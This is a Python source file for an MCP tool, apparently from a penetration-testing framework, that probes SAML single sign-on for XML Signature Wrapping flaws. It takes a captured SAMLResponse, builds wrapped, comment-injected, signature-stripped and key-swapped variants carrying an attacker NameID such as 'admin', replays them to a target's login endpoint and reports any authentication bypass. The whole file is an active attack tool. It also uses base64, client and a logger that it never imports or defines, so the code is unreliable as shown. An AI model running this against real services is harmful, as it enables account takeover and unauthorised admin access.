"""probe_saml_xsw — SAML XML Signature Wrapping active probe (W29-c).

The saml KB (post-W29-i merge) has 5 XSW contexts but no active tool to
build + replay the mutations. Operator captures a real SAMLResponse via
Burp; this tool builds 5 XSW variants and replays each through the ACS
endpoint, comparing for auth-bypass markers (Set-Cookie / 302 redirect to
authenticated path / admin marker in response body).

Variants:
  1. **xsw1_wrap_assertion** — clone the signed Assertion, place malicious
     copy outside the signed scope but in document order BEFORE the original.
  2. **xsw2_sibling_wrap** — same as xsw1 but malicious copy as sibling.
  3. **comment_injection** — inject `<!---->` into NameID to split the
     parser's canonicalisation result from what app code reads.
  4. **signature_exclusion** — strip ds:Signature entirely.
  5. **keyinfo_swap** — replace KeyInfo with attacker cert (operator-provided).

The XML mutations are deterministic string transforms over the captured
SAMLResponse — no xmlsec dep, no protocol library. Operator-built keyinfo
cert is optional (variants 1-4 work on the captured response as-is).

VerdictResult:
  - CONFIRMED — any variant lands on an authenticated state (302 → /home
    or similar, Set-Cookie session token, admin-marker in body)
  - SUSPECTED — server returns 200/302 with same status as baseline (could
    be auth-OK or just a redirect-to-login replay)
  - FAILED — all variants rejected with 400/401/403 + signature-error marker
"""

from __future__ import annotations

from mcp.server.fastmcp import FastMCP

from praetor.tools.testing._verdict import error_verdict, make_verdict
from ._saml_xsw_mutations import (  # re-exported for tests/importers
    _AUTH_OK_MARKERS, _SIG_REJECT_MARKERS, _SIG_RE, _ASSERTION_RE, _NAMEID_RE,
    _xsw_signature_exclusion, _xsw_wrap_assertion, _xsw_sibling_wrap,
    _xsw_comment_injection, _xsw_keyinfo_swap, _classify_replay, _send_acs,
)


def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def probe_saml_xsw(  # cost: low-med (5-6 requests)
        acs_url: str,
        saml_response_b64: str,
        relay_state: str = "",
        attacker_nameid: str = "admin",
        attacker_cert_pem: str = "",
        run_keyinfo_swap: bool = False,
        timeout: int = 30,
    ) -> dict:
        """Probe SAML XSW + signature-exclusion + comment-injection.

        Operator captures a real SAMLResponse from a successful login via
        Burp, then provides:
          - acs_url — the SP's Assertion Consumer Service endpoint
          - saml_response_b64 — the captured SAMLResponse (still base64)
          - relay_state — corresponding RelayState (often empty)
          - attacker_nameid — the NameID to swap into the wrapped assertion
            (e.g. 'admin', 'admin@target.tld', or a known victim username)
          - attacker_cert_pem — optional, for keyinfo_swap variant

        VerdictResult:
          - CONFIRMED — ≥1 variant lands on auth-OK markers
          - SUSPECTED — ≥1 variant returns 200/302 with no clear reject marker
          - FAILED — all variants rejected with signature-error markers

        Args:
            acs_url: SP Assertion Consumer Service URL
            saml_response_b64: captured SAMLResponse (base64)
            relay_state: captured RelayState (often "")
            attacker_nameid: NameID to inject in wrapped assertion
            attacker_cert_pem: optional PEM for keyinfo_swap variant
            run_keyinfo_swap: enable variant 5 (default off — requires cert)
            timeout: per-request timeout (s)
        """
        scope = await client.check_scope(acs_url)
        if not scope.get("in_scope"):
            return error_verdict(f"{acs_url} not in scope",
                                 vuln_type="saml_xsw", reason="out_of_scope")

        try:
            saml_xml = base64.b64decode(saml_response_b64)
        except Exception as e:
            return error_verdict(f"saml_response_b64 not valid b64: {e}",
                                 vuln_type="saml_xsw", reason="bad_payload")

        if b"<" not in saml_xml or b"Assertion" not in saml_xml:
            return error_verdict("decoded payload does not look like SAML XML",
                                 vuln_type="saml_xsw", reason="bad_payload")

        # First, replay the original to establish baseline
        baseline_resp = await _send_acs(acs_url, saml_xml, relay_state, timeout=timeout)
        if baseline_resp.get("error"):
            return error_verdict(baseline_resp.get("error", ""),
                                 vuln_type="saml_xsw", reason="baseline_failed")
        baseline_status = baseline_resp.get("status_code", 0)
        logger_indices = []
        if "logger_index" in baseline_resp:
            logger_indices.append(baseline_resp["logger_index"])

        variants: list[tuple[str, bytes | None]] = [
            ("xsw1_wrap_before", _xsw_wrap_assertion(saml_xml, attacker_nameid)),
            ("xsw2_sibling_after", _xsw_sibling_wrap(saml_xml, attacker_nameid)),
            ("comment_injection", _xsw_comment_injection(
                saml_xml, "victim", "attacker.tld")),
            ("signature_exclusion", _xsw_signature_exclusion(saml_xml)),
        ]
        if run_keyinfo_swap:
            variants.append(("keyinfo_swap",
                             _xsw_keyinfo_swap(saml_xml, attacker_cert_pem)))

        variant_results = []
        confirmed_variants = []
        suspected_variants = []

        for name, mutated in variants:
            if mutated is None:
                variant_results.append({
                    "variant": name, "skipped": True,
                    "reason": "no match for mutation source",
                })
                continue
            resp = await _send_acs(acs_url, mutated, relay_state, timeout=timeout)
            if resp.get("error"):
                variant_results.append({
                    "variant": name, "error": resp.get("error", ""),
                })
                continue
            if "logger_index" in resp:
                logger_indices.append(resp["logger_index"])
            state, evidence = _classify_replay(resp, baseline_status)
            variant_results.append({
                "variant": name,
                "status": resp.get("status_code", 0),
                "auth_state": state,
                "evidence": evidence,
            })
            if state == "auth_ok":
                confirmed_variants.append(name)
            elif state == "ambiguous":
                suspected_variants.append(name)

        if confirmed_variants:
            return make_verdict(
                vuln_type="saml_xsw",
                verdict="CONFIRMED",
                confidence=0.9,
                evidence_summary=f"{len(confirmed_variants)} XSW variant(s) reached authenticated state: {', '.join(confirmed_variants)}",
                logger_indices=logger_indices,
                details={
                    "acs_url": acs_url,
                    "confirmed_variants": confirmed_variants,
                    "all_variants": variant_results,
                    "baseline_status": baseline_status,
                },
                summary=f"SAML XSW: bypassed via {confirmed_variants[0]}",
            )
        if suspected_variants:
            return make_verdict(
                vuln_type="saml_xsw",
                verdict="SUSPECTED",
                confidence=0.55,
                evidence_summary=f"{len(suspected_variants)} variant(s) match baseline status without rejection",
                logger_indices=logger_indices,
                details={
                    "suspected_variants": suspected_variants,
                    "all_variants": variant_results,
                    "baseline_status": baseline_status,
                },
                summary=f"SAML XSW SUSPECTED — {suspected_variants[0]} returned baseline status",
            )
        return make_verdict(
            vuln_type="saml_xsw",
            verdict="FAILED",
            confidence=0.85,
            evidence_summary="All XSW variants rejected with signature-error markers",
            logger_indices=logger_indices,
            details={"all_variants": variant_results,
                     "baseline_status": baseline_status},
            summary="SAML correctly enforces signature coverage",
        )
